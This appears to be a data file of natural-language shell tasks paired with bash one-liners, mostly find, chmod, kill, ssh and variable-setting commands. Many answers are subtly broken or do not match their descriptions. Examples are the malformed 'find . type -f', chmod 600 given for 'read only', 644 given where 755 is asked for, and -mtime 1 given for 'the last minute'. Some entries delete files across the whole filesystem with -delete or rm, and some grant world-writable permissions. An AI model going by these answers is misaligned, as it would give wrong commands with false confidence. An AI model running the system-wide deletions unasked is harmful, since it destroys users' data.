{"input": "Search the current directory recursively for files last modified within the past 24 hours ignoring .swp files and paths ./es* and ./en*", "answer": "find \"$(pwd -P)\" -mtime 0 -not \\( -name '*.swp' -o -regex './es.*' -o -regex './en.*' \\)"}
{"input": "Search the current directory recursively for files last modified within the past 24 hours ignoring paths ./es* and ./en*", "answer": "find . -mtime 0 | grep -v '^\\./en' | grep -v '^\\./es'"}
{"input": "Search the current directory recursively for files whose size is between 10 and 50 MB", "answer": "find . -size +10M -size -50M -print"}
{"input": "Search the current directory recursively for files with the exact permissions u=rwx,g=rx,o=rx", "answer": "find . -perm a=rwx,g-w,o-w"}
{"input": "Search the current directory recursively for files writable for `others'", "answer": "find . -perm -o+w"}
{"input": "Search the current directory recursively for regular files last accessed 2 minutes ago", "answer": "find . type -f -amin 2"}
{"input": "Search the current directory recursively for regular files last accessed more than 2 days ago", "answer": "find . type -f -atime +2"}
{"input": "Search the current directory recursively for regular files last changed 2 days ago", "answer": "find . type -f -ctime 2"}
{"input": "Search the current directory recursively for regular files last changed more than 2 days ago", "answer": "find . type -f -ctime +2"}
{"input": "Search the current directory recursively for regular files with the read permission set for everybody", "answer": "find -type f ! -perm -444"}
{"input": "Search the current directory recursively for regular files, skipping hidden files in the current directory", "answer": "find * -type f -print"}
{"input": "Search the current directory recursively for the largest files", "answer": "find . -type f -printf '%20s %p\\n' | sort -n | cut -b22- | tr '\\n' '\\000' | xargs -0 ls -laSr"}
{"input": "Search the current directory tree for *.c and *.asm files, ignoring the case", "answer": "find . -type f \\( -iname \"*.c\" -or -iname \"*.asm\" \\)"}
{"input": "Search the current directory tree for *.wav files that have \"export\" in their pathnames", "answer": "find -type f -name \"*.wav\" | grep export"}
{"input": "Search the current directory tree for *bash* files", "answer": "find . -name \"*bash*\""}
{"input": "Search the current directory tree for *bash* files printing them on a single line", "answer": "find . -name \"*bash*\" | xargs"}
{"input": "Search the current directory tree for .VER files", "answer": "find . -name \"*.VER\""}
{"input": "Search the current directory tree for .aux files", "answer": "find . -name \".aux\""}
{"input": "Search the current directory tree for .log files containing the string \"The SAS System\" on the first line", "answer": "find . -name '*.log'  -type f  -readable  ! -size 0 -exec sed -n '1{/The SAS System/q0};q1' {} \\; -print"}
{"input": "Search the current directory tree for .rb files ignoring .vendor directories", "answer": "find . -name .vendor -prune -o -name '*.rb' -print"}
{"input": "Search the current directory tree for .rb files ignoring the \"./vendor\" subdirectory", "answer": "find . -name '*.rb' ! -wholename \"./vendor/*\" -print"}
{"input": "Search the current directory tree for TXT files skipping hidden ones", "answer": "find . -type f \\( -iname \"*.txt\" ! -iname \".*\" \\)"}
{"input": "Search the current directory tree for all .java files that were last modified at least 7 days ago", "answer": "find . -name '*.java' -mtime +7 -print"}
{"input": "Search the current directory tree for all files except SVN ones", "answer": "find .  ! -regex \".*[/]\\.svn[/]?.*\""}
{"input": "Search the current directory tree for all files matching either pattern \"*.rb\" or pattern \"*.py\"", "answer": "find . -name \"*.rb\" -or -name \"*.py\""}
{"input": "Search the current directory tree for all files matching regular expression \".*\\.rb$\"", "answer": "find . -regex \".*\\\\.rb$\""}
{"input": "Search the current directory tree for all image files", "answer": "find . -type f -regex \".*\\.\\(jpg\\|jpeg\\|gif\\|png\\|JPG\\|JPEG\\|GIF\\|PNG\\)\""}
{"input": "Search the current directory tree for all regular non-hidden files except *.o", "answer": "find ./ -type f -name \"*\" -not -name \"*.o\""}
{"input": "Search the current directory tree for an html file having the text 'Web sites' in it", "answer": "find . -type f -iname \\*.html -exec grep -s \"Web sites\" {} \\;"}
{"input": "Search the current directory tree for directories", "answer": "find \"$PWD\" -type d"}
{"input": "Search the current directory tree for directories lacking execute permissions for user, group, or others", "answer": "find . -type d ! -perm -111"}
{"input": "Search the current directory tree for directories that can be opened by noone", "answer": "find -type d ! -perm -111"}
{"input": "Search the current directory tree for executable files", "answer": "find . -type f -executable -print"}
{"input": "Search the current directory tree for executable files and searchable directories", "answer": "find -executable"}
{"input": "Search the current directory tree for file \"a.txt\"", "answer": "find . -name \"a.txt\" -print"}
{"input": "Search the current directory tree for file `teste.tex'", "answer": "find -name teste.tex"}
{"input": "Search the current directory tree for files AAA and BBB", "answer": "find . \\( -name AAA -o -name BBB \\) -print"}
{"input": "Search the current directory tree for files and directories whose names do not end in \".exe\" and \".dll\"", "answer": "find . ! \\( -name \"*.exe\" -o -name \"*.dll\" \\)"}
{"input": "Search the current directory tree for files and directories whose names do not end in \"exe\" and \"dll\"", "answer": "find . | grep -v '(dll|exe)$'"}
{"input": "Search the current directory tree for files containing \"album\" and \"vacations\" in their names and not containing \"2015\"", "answer": "find . -name \"*album*\" -a -name \"*vacations*\" -a -not -name \"*2015*\""}
{"input": "Search the current directory tree for files containing \"bash\" in their names", "answer": "find . -name \"*bash*\" | xargs"}
{"input": "Search the current directory tree for files containing \"needle\" in their names", "answer": "find . -iname \"*needle*\""}
{"input": "Search the current directory tree for files containing \"string\" in their path names", "answer": "find | egrep string"}
{"input": "Search the current directory tree for files executable by at least someone", "answer": "find . -type f -perm +111 -print"}
{"input": "Search the current directory tree for files matching regular expression '^myfile[0-9][0-9]?$'", "answer": "find . -\\( -name \"myfile[0-9][0-9]\" -o -name \"myfile[0-9]\" \\)"}
{"input": "Search the current directory tree for files named \"somename\", case insensitive", "answer": "find -iname 'somename'"}
{"input": "Search the current directory tree for files whose name is \".note\", case insensitive", "answer": "find -type d -exec find {} -maxdepth 1 \\! -type d -iname '.note' \\;"}
{"input": "Search the current directory tree for files whose names are not \"a.txt\"", "answer": "find . ! -name \"a.txt\" -print"}
{"input": "Search the current directory tree for files whose names begin with \"my\" and end with \"p\" followed by any character", "answer": "find . -regex \".*/my.*p.$\""}
{"input": "Search the current directory tree for files whose names begin with \"my\" and end with \"p\" followed by any character, ignoring path names containing \"test\"", "answer": "find . -regex \".*/my.*p.$\" -a -not -regex \".*test.*\""}
{"input": "Search the current directory tree for files whose names contain \"TextForRename\"", "answer": "find ./ -name \"*TextForRename*\""}
{"input": "Search the current directory tree for files whose names contain \"bills\"", "answer": "find . -name '*bills*' -print"}
{"input": "Search the current directory tree for files whose names do not end in \".exe\" and \".dll\"", "answer": "find . -not -name \"*.exe\" -not -name \"*.dll\" -not -type d"}
{"input": "Search the current directory tree for files whose names do not end in \"1\" and \"2\"", "answer": "find . -type f ! -name \"*1\" ! -name \"*2\" -print"}
{"input": "Search the current directory tree for files whose names end in \"rb\" or \"js\"", "answer": "find . -name \"*js\" -o -name \"*rb\""}
{"input": "Search the current directory tree for files whose names end in \"rb\" or \"js\" and which contain string \"matchNameHere\"", "answer": "find . -regextype posix-ergep -regex \".*(rb|js)$\" -exec grep -l matchNameHere {} \\;"}
{"input": "Search the current directory tree for files whose names match regular expression '.*packet.*', ignoring the case", "answer": "find . -iregex \".*packet.*\""}
{"input": "Search the current directory tree for files whose names start with \"f\"", "answer": "find . -name f* -print"}
{"input": "Search the current directory tree for files without \"test\" in their path names", "answer": "find . -not -regex \".*test.*\""}
{"input": "Search the current directory tree for hidden files", "answer": "find .*"}
{"input": "Search the current directory tree for hidden files skipping .htaccess", "answer": "find . -type f \\( -iname \".*\" ! -iname \".htaccess\" \\)"}
{"input": "Search the current directory tree for regular files changed on the 10th of September", "answer": "find ./ -type f -ls |grep '10 Sep'"}
{"input": "Search the current directory tree for regular files modified within the past 24 hours whose names do not end with \".DS_Store\"", "answer": "find . -mtime -1 ! -name '.DS_Store' -type f -exec basename {} \\;"}
{"input": "Search the current directory tree for regular files named `doc.txt' and print \"found\" for each of them", "answer": "find ./ -type f -name doc.txt -printf \"found\\n\""}
{"input": "Search the current directory tree for regular files omitting directory `omit-directory'", "answer": "find . -name omit-directory -prune -o -type f"}
{"input": "Search the current directory tree for regular files that can be read by noone", "answer": "find -type f ! -perm -444"}
{"input": "Search the current directory tree for regular files that contain \"string\"", "answer": "find . -type f -print0 | xargs -0 grep string"}
{"input": "Search the current directory tree for regular files that were changed $FTIME days ago", "answer": "find . -type f -ctime $FTIME"}
{"input": "Search the current directory tree for regular files whose names end in \"log\"", "answer": "find `pwd` -name \"*log\" -type f"}
{"input": "Search the current directory tree for symbolic links to files matching pattern '*/test*'", "answer": "find -P . -lname '*/test*'"}
{"input": "Search the current directory tree for symbolic links to files matching pattern '*test*'", "answer": "find . -lname '*test*'"}
{"input": "Search the current directory tree for symlinks pointing at other symlinks", "answer": "find . -type l -xtype l"}
{"input": "Search the current directory tree for symlinks whose contents match pattern \"*sysdep.c\"", "answer": "find . -lname '*sysdep.c'"}
{"input": "Search the current directory tree for the files with extension \"trc\" and list them if they are more than three days old", "answer": "find . -name \"*.trc\" -ctime +3 -exec ls -l {} \\;"}
{"input": "Search the current directory, except the subdirectory tree \".svn\", for files whose name is \"foo.cpp\"", "answer": "find . -name 'foo.cpp' '!' -path '.svn'"}
{"input": "Search the current user's home directory and below for all .png files and copy those files in the directory imagesdir", "answer": "find ~/ -name *.png -exec cp {} imagesdir \\;"}
{"input": "Search the current user's home directory and its sub-directories for any file that ends in .tar-gz and was modified after filename was last modified", "answer": "find ~/ -name *.tar.gz -newer filename"}
{"input": "Search the current user's home directory and its sub-directories for any file that was modified less than 2 days ago or was modified after filename was last modified", "answer": "find ~/ -mtime -2 -o -newer filename"}
{"input": "Search the current user's home directory and its sub-directories for any files accessed after alldata.tar was last accessed and add them to that same tar archive", "answer": "find ~/ -newer alldata.tar \t-exec tar uvf alldata.tar {} \\;"}
{"input": "Search the current working directory tree for files whose names start with \"fileA_\" or \"fileB_\"", "answer": "find . -name 'fileA_*' -o -name 'fileB_*'"}
{"input": "Search the dir_data directory and all of its sub-directories for regular files and remove the execute permission for all while adding the write permission for the user", "answer": "find ~/dir_data -type f  -exec chmod a-x,u+w {} \\;"}
{"input": "Search the directories given as arguments to the Bash script for files whose name is not \"ss\"", "answer": "find $@ -not -name ss"}
{"input": "Search the directories that match pattern '/path/to/directory/folder{?,[1-4]?,50}' for .txt files", "answer": "find /path/to/directory/folder{?,[1-4]?,50} -name '*.txt'"}
{"input": "Search the entire file hierarchy for all regular files owned by olduser and change their ownership to newuser", "answer": "find / -user olduser  -type f  -exec chown newuser {} \\"}
{"input": "Search the entire file hierarchy for files ending in '.old' and delete them", "answer": "find / -name \"*.old\" -delete"}
{"input": "Search the entire file hierarchy for files ending with '~' and print all matches except for those with '/media' in their pathnames", "answer": "find / -name \"*~\" | grep -v \"/media\""}
{"input": "Search the entire file hierarchy for files larger than 100 megabytes and delete them", "answer": "find / -size +100M -exec /bin/rm {} \\;"}
{"input": "Search the entire file system for .jpg files", "answer": "find / -name '*.jpg'"}
{"input": "Search the entire file system for any file that is writable by other", "answer": "find / \u2013 perm -0002"}
{"input": "Search the entire system for SUID or SGID files", "answer": "find / -path /proc -prune -o -type f -perm +6000 -ls"}
{"input": "Search the file hierarchy for files larger than 100000 KB without searching any mounted removable media", "answer": "find / -path /media -prune -o -size +200000 -print"}
{"input": "Search the file system for regular files whose names are shorter than 25 characters", "answer": "find / -type f -regextype posix-extended -regex '.*/.{1,24}$'"}
{"input": "Search the file system for regular files whose pathnames are shorter than 25 characters", "answer": "find / -type f|awk -F'/' '{print $NF}'| awk 'length($0) < 25'"}
{"input": "Search the files from directory tree \"dirname\" for string \"foo\"", "answer": "find dirname  -print0 | xargs -0 grep foo"}
{"input": "Search the files from the current directory tree for \"chrome\"", "answer": "find . -exec grep chrome {} +"}
{"input": "Search the files from the current directory tree for text \"documentclass\"", "answer": "find . -type f -print0 | xargs -0 grep -H 'documentclass'"}
{"input": "Search the files in the current directory tree for lines containing string \"vds admin\"", "answer": "find . -exec grep -i \"vds admin\" {} \\;"}
{"input": "Search the files in the current directory tree that are named \"string to be searched\" for \"text\"", "answer": "find . -name \"string to be searched\" -exec grep \"text\" \"{}\" \\;"}
{"input": "Search the files residing in the current directory tree whose names contain \"bills\" for \"put\"", "answer": "find . -name \"*bills*\" -print0 | xargs -0 grep put"}
{"input": "Search the files under and below /directory/containing/files for \"text to search\"", "answer": "find /directory/containing/files -type f -print0 | xargs -0 grep \"text to search\""}
{"input": "Search the given $directory for files with permissions stored in $permissions", "answer": "find \"$directory\" -perm \"$permissions\""}
{"input": "Search the home directory for OGG and MP3 files", "answer": "find $HOME -iname '*.ogg' -o -iname '*.mp3'"}
{"input": "Search the home directory for filenames starting with \"xx\" except for \"xxx\" files", "answer": "find ~ -name 'xx*' -and -not -name 'xxx'"}
{"input": "Search the home directory for files accessed more than 10 days ago", "answer": "find ~/ -atime +10"}
{"input": "Search the home directory for files whose names begin with \"test\"", "answer": "find ~ -name \"test*\" -print"}
{"input": "Search the home directory tree for .tar.gz files newer than file \"filename\"", "answer": "find ~/ -name *.tar.gz -newer filename"}
{"input": "Search the home directory tree for all .txt files", "answer": "find ~/ -name '*.txt'"}
{"input": "Search the home directory tree for files last modified less than 2 days ago or newer than file \"filename\"", "answer": "find ~/ -mtime -2 -o newer filename"}
{"input": "Search the home directory tree for files last modified more than a year ago", "answer": "find $HOME -mtime +365"}
{"input": "Search the home directory tree for files modified less than 7 days ago", "answer": "find $HOME -mtime -7"}
{"input": "Search the home directory tree for files modified less than a day ago", "answer": "find $HOME -mtime -1"}
{"input": "Search the home directory tree for files owned by sam", "answer": "find /home -user sam"}
{"input": "Search the home directory tree for video files", "answer": "find ~ -type f -name '*.mkv' -o -name '*.mp4' -o -name '*.wmv' -o -name '*.flv' -o -name '*.webm' -o -name '*.mov'"}
{"input": "Search the local subdirectory tree of the current working directory and the /tmp directory tree for directories named mydir", "answer": "find local /tmp -name mydir -type d -print"}
{"input": "Search the path given as the $absolute_dir_path variable for regular files", "answer": "find \"$absolute_dir_path\" -type f -print0"}
{"input": "Search the regular files from directory tree 'directory_name' for \"word\" and print the names of the matched files", "answer": "find directory_name -type f -print0 | xargs -0 grep -li word"}
{"input": "Search the regular files from directory tree 'folder_name' for \"your_text\"", "answer": "find folder_name -type f -exec grep your_text  {} \\;"}
{"input": "Search the regular files of the current directory tree for string \"foo\"", "answer": "find . -type f -exec grep \"foo\" '{}' \\;"}
{"input": "Search the regular files of the current directory tree for string \"stringYouWannaFind\", ignoring the case", "answer": "find ./ -type f -print -exec grep -n -i \"stringYouWannaFind\" {} \\;"}
{"input": "Search the regular files of the current directory tree for string \"stuff\"", "answer": "find . -type f -exec grep -n \"stuff\" {} \\; -print"}
{"input": "Search the regular files of the current directory tree for string \"texthere\"", "answer": "find -type f -exec grep -Hn \"texthere\" {} +"}
{"input": "Search the regular files of the current directory tree for string \"whatever\"", "answer": "find . -type f -exec grep -H whatever {} \\;"}
{"input": "Search the specified group for the given \"filename", "answer": "find / -group users -iname \"filename\""}
{"input": "Search the specified user for the given \"filename\"", "answer": "find / -user pat -iname \"filename\""}
{"input": "Search the system for *.rpm files ignoring removable media", "answer": "find / -xdev -name \\*.rpm"}
{"input": "Search the system for files and directories owned by group `managers'", "answer": "find / -group managers -print"}
{"input": "Search the system for files and directories owned by user `admin'", "answer": "find / -user admin -print"}
{"input": "Search the system for files whose names begin with letters 'a', 'b', or 'c'", "answer": "find  / -name '[a-c]*'"}
{"input": "Search the system for the file 'myfile' ignoring permission denied errors", "answer": "find . -name myfile |& grep -v 'Permission denied'"}
{"input": "Search the ~ and `Music' directory trees for .mp3 files", "answer": "find ~ Music -name '*.mp3'"}
{"input": "Searches for 'something' in a large file and prints the matching line", "answer": "grep -n 'something' HUGEFILE | head -n 1"}
{"input": "Searches the manual pages with descriptions in section 3, that name begins with lowercase letter", "answer": "apropos -s 3 . | grep ^[a-z]"}
{"input": "See all pages in section 3", "answer": "apropos -s 3 ."}
{"input": "See what files are executable by the file's owner and group", "answer": "find -type f -perm -110"}
{"input": "Select everything selected by * without descending into any directories", "answer": "find * -maxdepth 0"}
{"input": "Send 4 ping packets of size 2 to \"www.google.com\" on a Solaris machine", "answer": "ping -s www.google.com 2 4"}
{"input": "Send 5 pings to broadcast address \"10.10.0.255\" and print the unique IPs who responded", "answer": "ping -c 5 -b 10.10.0.255 | grep 'bytes from' | awk '{ print $4 }' | sort | uniq"}
{"input": "Send Output From Find The Find Command To A File", "answer": "find / -name *.mp3 -fprint nameoffiletoprintto"}
{"input": "Send SIGHUP (hangup) signal to all parents of zombie processes", "answer": "kill -HUP $(ps -A -ostat,ppid | grep -e '[zZ]'| awk '{ print $2 }')"}
{"input": "Send SIGHUP (hangup) signal to nginx master process, causing it to re-read its configuration and restart child processes if necessary", "answer": "kill -HUP $( cat /var/run/nginx.pid )"}
{"input": "Send SIGTERM (signal 15) signal to all process whose username is \"username\" and whose command is \"your_command\"", "answer": "ps -o uid,pid,cmd|awk '{if($1==\"username\" && $3==\"your_command\") print $2}'|xargs kill -15"}
{"input": "Send SIGTERM signal to entire process tree starting from ID 24901 and below", "answer": "kill `pstree -p 24901 | sed 's/(/\\n(/g' | grep '(' | sed 's/(\\(.*\\)).*/\\1/' | tr \"\\n\" \" \"`"}
{"input": "Send SIGWINCH process to current shell, causing it to update the LINES and COLUMNS variables which describe the size of the screen/window in characters", "answer": "kill -s WINCH $$"}
{"input": "Send each byte in \"/home/cscape/Desktop/file\" to awk script \"x.awk\"", "answer": "fold -1 /home/cscape/Desktop/file  | awk -f x.awk"}
{"input": "Send each byte in \"/home/cscape/Desktop/table.sql\" to awk", "answer": "fold -1 /home/cscape/Desktop/table.sql  | awk '{print $0}'"}
{"input": "Send one ping request to host whose name or IP address is specified by variable \"ip\", using network interface eth9", "answer": "ping ${ip} -I eth9 -c 1"}
{"input": "Send reverse requests to get domain name for each address in 'my_ips' list", "answer": "cat my_ips | xargs -i dig -x {} +short"}
{"input": "Serach  in root directory all files which  have more than 2 links", "answer": "find / -links +2 -print"}
{"input": "Serach for all the files containing grep in man pages", "answer": "find /usr/share/man/ -regex .*grep*"}
{"input": "Serach for all the files starting with grep in man pages", "answer": "find /usr/share/man/ -regex grep.*"}
{"input": "Set 444 permission to all regular files under current directory", "answer": "find . -type f -print | xargs chmod 444"}
{"input": "Set 644 permission to all regular files under /home/my/special/folder directory", "answer": "chmod 644 `find /home/my/special/folder -type f`"}
{"input": "Set environment variables using assignments are listed in '.env' file and run 'rails' command with defined environment", "answer": "env $(cat .env | xargs) rails"}
{"input": "Set file permission to 664 and directory permission to 775 for all files and directories under htdocs", "answer": "find htdocs -type f -exec chmod 664 {} + -o -type d -exec chmod 775 {} +"}
{"input": "Set permission of \"file\" to read only for the owner", "answer": "chmod 600 file"}
{"input": "Set permissions for all regular files under /var/www to 755", "answer": "find /var/www -type f -print0 | xargs -0 chmod 644"}
{"input": "Set permissions for directories in `foldername' and its subdirectories to 755", "answer": "find foldername -type d -exec chmod 755 {} \";\""}
{"input": "Set permissions for files in `foldername' and its subdirectories to 644", "answer": "find foldername -type f -exec chmod 644 {} \";\""}
{"input": "Set permissions for files in `foldername' to 777", "answer": "find foldername -exec chmod a+rwx {} \";\""}
{"input": "Set permissions of all directories under \"/path/to/base/dir\" to 755", "answer": "chmod 755 $(find /path/to/base/dir -type d)"}
{"input": "Set permissions of command \"node\" to 755", "answer": "sudo chmod 755 $(which node)"}
{"input": "Set permissions to 500 for directories under the current directory", "answer": "find . -type d -exec chmod 500 {} \\;"}
{"input": "Set permissions to 660 for all regular files in the current directory tree", "answer": "find . -type f -exec chmod 0660 {} +"}
{"input": "Set permissions to 700 for directories under media/", "answer": "find media/ -type d -exec chmod 700 {} \\;"}
{"input": "Set permissions to 700 for directories under var/", "answer": "find var/ -type d -exec chmod 700 {} \\;"}
{"input": "Set permissions to 700 for every subdirectory of the current directory", "answer": "find . -mindepth 1 -type d -print0 | xargs -0 chmod -R 700"}
{"input": "Set permissions to 755 for every subdirectory of the current directory", "answer": "find  . -type d -mindepth 1 -print -exec chmod 755 {}/* \\;"}
{"input": "Set permissions to ug=rw,o= for files inside the ./default/files tree", "answer": "find ./default/files -type f -exec chmod ug=rw,o= '{}' \\;"}
{"input": "Set permissions to ug=rw,o= for files under the $d directory tree", "answer": "find $d -type f -exec chmod ug=rw,o= '{}' \\;"}
{"input": "Set permissions to ug=rwx,o= for directories under the $d directory tree", "answer": "find $d -type d -exec chmod ug=rwx,o= '{}' \\;"}
{"input": "Set prompt to the system host name and history number", "answer": "PS1=\"`hostname`:\\!>\""}
{"input": "Set read, write and execute permission for all (owner, group, other) for the files/directories in foldername directory tree", "answer": "sudo find foldername -exec chmod a+rwx {} \";\""}
{"input": "Set the bash environmental variable \"PROMPT_COMMAND\" to save the output of the last executed command to variable \"LAST\" and file '/tmp/x\"", "answer": "PROMPT_COMMAND='LAST=\"`cat /tmp/x`\"; exec >/dev/tty; exec > >(tee /tmp/x)'"}
{"input": "Set the bash prompt to \"username@hostname\"", "answer": "PS1=\"`whoami`@`hostname | sed 's/\\..*//'`\""}
{"input": "Set the environment variable \"DISPLAY\" to the system host name followed by \":0 skype\"", "answer": "DISPLAY=`hostname`:0 skype"}
{"input": "Set the executable bit for all users on all .sh scripts from directory trees lib, etc, debian", "answer": "find lib etc debian -name \"*.sh\" -type f | xargs chmod +x"}
{"input": "Set the executable bit for all users on all regular files from directories arch/x86/usr/sbin, arch/x86/usr/X11R6/bin, usr/sbin/", "answer": "find arch/x86/usr/sbin arch/x86/usr/X11R6/bin usr/sbin/ -type f | xargs chmod a+x"}
{"input": "Set the group to \"username\" for all files with GID=1000 in the current directory tree", "answer": "find -gid 1000 -exec chown -h :username {} \\;"}
{"input": "Set the host name to \"myServersHostname\"", "answer": "hostname myServersHostname"}
{"input": "Set the host name to the contents of \"/etc/hostname\"", "answer": "hostname $(cat /etc/hostname)"}
{"input": "Set the modification timestamp of file 'filename' to specified date/time", "answer": "touch -m --date=\"Wed Jun 12 14:00:00 IDT 2013\" filename"}
{"input": "Set the permissions of all directories inside the current directory tree to ug=rwx,o=", "answer": "find . -type d -name files -exec chmod ug=rwx,o= '{}' \\;"}
{"input": "Set the read bit for \"other\" on all *rc.conf files in the current directory tree", "answer": "find . -name \"*rc.conf\" -exec chmod o+r '{}' \\;"}
{"input": "Set the shell prompt to \"host:pwd>\"", "answer": "PS1=`hostname`':\\W> '"}
{"input": "Set the system date to Sat May 11 06:00:00 IDT 2013", "answer": "sudo date --set=\"Sat May 11 06:00:00 IDT 2013\""}
{"input": "Set the value of \"to_sort\" to \"$1\" in a subshell which no longer exists after the pipeline completes", "answer": "echo \"$1\"| read -a to_sort"}
{"input": "Set the variable \"me\" to the name of the running script, or shell, login shells have a hyphen appended to the beginning of the name, such as \"-bash\"", "answer": "me=`basename -- \"$0\"`"}
{"input": "Set the variable \"me\" to the name of the running script", "answer": "me=`basename \"$0\"`"}
{"input": "Set timestamp of B to the timestamp in stat format specified by variable \"old_time\"", "answer": "touch -d\"$(date --date=\"@$old_time\")\" B"}
{"input": "Set timestamp of all PHP files in current directory to date specified", "answer": "touch -d '30 August 2013' *.php"}
{"input": "Set timestamp of old_file.dat to specified timestamp", "answer": "touch -t 200510071138 old_file.dat"}
{"input": "Set trace prompt to print seconds, nnoseconds, script name, and line number", "answer": "PS4='+$(date \"+%s:%N\") %N:%i> '"}
{"input": "Set trace prompt to print seconds.nanoseconds", "answer": "PS4='+ $(date \"+%s.%N\")\\011 '"}
{"input": "Set up SSH connection forwarding in the background with no terminal or command execution from localhost port 8888 to \"proxyhost\" port 8888 and a reverse connection from \"officefirewall\" port 22222 to \"localhost\" port 22", "answer": "ssh -fNT -L8888:proxyhost:8888 -R22222:localhost:22 officefirewall"}
{"input": "Set up a local SSH tunnel from port 80 to port 3000", "answer": "ssh $USERNAME@localhost -L 80:localhost:3000 -N"}
{"input": "Set up a remote port forward from port 10022 on host \"server\" to port 22 on localhost", "answer": "ssh -R 10022:localhost:22 device@server"}
{"input": "Set up local port forwards in the background with no terminal or command execution from port 4431 to host \"www1\" port 443 and port 4432 to host \"www2\" port 443 via the host \"colocatedserver\"", "answer": "ssh -fNT -L4431:www1:443 -L4432:www2:443 colocatedserver"}
{"input": "Set variable \"b\" to the first word of \"a\" converted to lowercase", "answer": "b=`echo \"$a\" | awk '{ print tolower($1) }'`"}
{"input": "Set variable \"b\" to the first word of \"a\" converted to uppercase", "answer": "b=`echo \"$a\" | awk '{ print toupper($1) }'`"}
{"input": "Set variable \"extract_dir\" to list of top-level directories and files contained in tar archive specified by variable FILE", "answer": "extract_dir=$(tar -tf $FILE | cut -d/ -f1 | uniq)"}
{"input": "Set variable \"filename\" to only the name of document specified by URL, in this case \"pic.jpg\"", "answer": "filename=\"`basename \"http://pics.sitename.com/images/191211/pic.jpg\"`\""}
{"input": "Set variable \"finalName\" to the second-to-last slash-separated path component of variable \"path\"", "answer": "finalName=$(basename -- \"$(dirname -- \"$path\")\")"}
{"input": "Set variable \"fname\" to the basename of path specified in variable \"f\", that is remove everything up to the last slash if present", "answer": "fname=`basename $f`"}
{"input": "Set variable 'file' to the base name of first argument to script or function, that is the part following the last slash", "answer": "file=$( basename \"$1\" )"}
{"input": "Set variable 'path' to name of current directory (without the containing directories) converted to lowercase", "answer": "path=$(basename $(pwd) | awk '{print tolower($0)}')"}
{"input": "Set variable BZIP2_CMD to the full path of command \"bzip2\"", "answer": "BZIP2_CMD=`which bzip2`"}
{"input": "Set variable GZIP to the full path of command \"gzip\"", "answer": "GZIP=\"$(which gzip)\""}
{"input": "Set variable OS to the name of the operating system, ie. \"Linux\"", "answer": "OS=$(uname -s)"}
{"input": "Set variable PING to 1 if it's possible to ping host ADDRESS, to 0 otherwise", "answer": "PING=$(ping ADDRESS -c 1 | grep -E -o '[0-9]+ received' | cut -f1 -d' ')"}
{"input": "Set variable PacketLoss to first digit of percentage of packet loss occurring when pinging host specified by TestIP", "answer": "PacketLoss=$(ping \"$TestIP\" -c 2 | grep -Eo \"[0-9]+% packet loss\" | grep -Eo \"^[0-9]\")"}
{"input": "Set variable value to current kernel release name", "answer": "value=$(uname -r)"}
{"input": "Sets shell options 'extglob' and 'nullglob'", "answer": "shopt -s nullglob extglob"}
{"input": "Show a listing of files not modified in over 20 days or not accessed in over 40 days", "answer": "find /mydir \\(-mtime +20 -o -atime +40\\) -exec ls -l {} \\;"}
{"input": "Show a long listing of files not modified in over 20 days or not accessed in over 40 days", "answer": "find /mydir \\(-mtime +20 -o -atime +40\\) -exec ls -l {} \\;"}
{"input": "Show a long listing of the latest file or directory under current directory", "answer": "ls -lrt | tail -n1"}
{"input": "Show all files in /etc that are owned by root have been modified within the last minute", "answer": "find /etc/ -user root -mtime 1"}
{"input": "Show all files in user's home directory that have read, write and execute permissions set for user, group and others", "answer": "find ~ -perm 777"}
{"input": "Show all lines in file2 that don't contain the first field of any line in file1", "answer": "awk '{print $1}' file2 | comm -1 -3 file1 - | join file2 -"}
{"input": "Show all of the .conf files in Pat's user folder and subdirectories using the less pager", "answer": "find /home/pat -iname \"*.conf\" | less"}
{"input": "Show all running processes with a name matching \"postgres\"", "answer": "ps -ef | grep postgres"}
{"input": "Show all values (without the names) of variables whose name or value contains \"VARIABLE_NAME\"", "answer": "myVariable=$(env  | grep VARIABLE_NAME | grep -oe '[^=]*$');"}
{"input": "Show all variables whose name or value contains \"PATH\", sorted in reverse alphabetical order", "answer": "env | uniq | sort -r | grep PATH"}
{"input": "Show directory sizes in KB and sort to give the largest at the end", "answer": "du -sk $(find . -type d) | sort -n -k 1"}
{"input": "Show file type information for files in /usr/bin", "answer": "find /usr/bin | xargs file"}
{"input": "Show filename and filetype description of all PHP files in all directories contained in current directory whose name or filetype description includes \"UTF\"", "answer": "file */*.php | grep UTF"}
{"input": "Show filename and filetype description of all PHP files in current directory whose name or filetype description includes \"UTF\"", "answer": "file *.php | grep UTF"}
{"input": "Show files in maximum 1 level down the current directory that were modified less than 1 day ago from today", "answer": "less `find -maxdepth 1 -type f -daystart -mtime -1`"}
{"input": "Show logged in users with idle time of each one", "answer": "w | tr -s \" \" | cut -d\" \" -f1,5 | tail -n+3"}
{"input": "Show long listing of current directory by deleting all digits from the output", "answer": "ls -lt | tr -d 0-9"}
{"input": "Show ls's detailed output for all files named \"something\"", "answer": "find . -name something -exec ls -l {} \\;"}
{"input": "Show process tree with command-line arguments of a process that has id 20238", "answer": "pstree -a -p 20238"}
{"input": "Show the date in default format for tomorrow + 2 days + 10 minutes", "answer": "date -d tomorrow+2days-10minutes"}
{"input": "Show the epoch in default date/time format", "answer": "date -ud@0"}
{"input": "Show the explanation of find's debugging options", "answer": "find -D help"}
{"input": "Show the files or directories in the current directory whose names are not \"MyCProgram.c\"", "answer": "find -maxdepth 1 -not -iname \"MyCProgram.c\""}
{"input": "Show the last 10 .conf files found by `find' in the /etc directory", "answer": "find /etc -maxdepth 1 -name \"*.conf\" | tail"}
{"input": "Show the last 10 .conf files found by `find' in the /etc directory and 1 level below", "answer": "find /etc -maxdepth 2 -name \"*.conf\" | tail"}
{"input": "Show the list of all files on the system whose names do not end in \".c\"", "answer": "find / \\! -name \"*.c\" -print"}
{"input": "Show the list of files larger than 100 MB", "answer": "find / -size +100M -print"}
{"input": "Show the list of files modified less than a minute ago", "answer": "find / -mmin -1 -print"}
{"input": "Show the list of files that are not owned by user wnj or are not newer than file `ttt'", "answer": "find / \\! \\( -newer ttt -user wnj \\) -print"}
{"input": "Show the list of files that are owned by user wnj or are newer than file `ttt'", "answer": "find / \\( -newer ttt -or -user wnj \\) -print"}
{"input": "Show the list of user wnj's files that are newer than file `ttt'", "answer": "find / -newer ttt -user wnj -print"}
{"input": "Show the mv commands that would rename the *.so files in the current directory tree prepending their names with \"lib\"", "answer": "find . -name \"*.so\" -printf \"mv '%h/%f' '%h/lib%f'\\n\" | less -S"}
{"input": "Show the number of lines for each PHP file in the current directory tree", "answer": "find . -type f -name \"*.php\" -exec wc -l {} +;"}
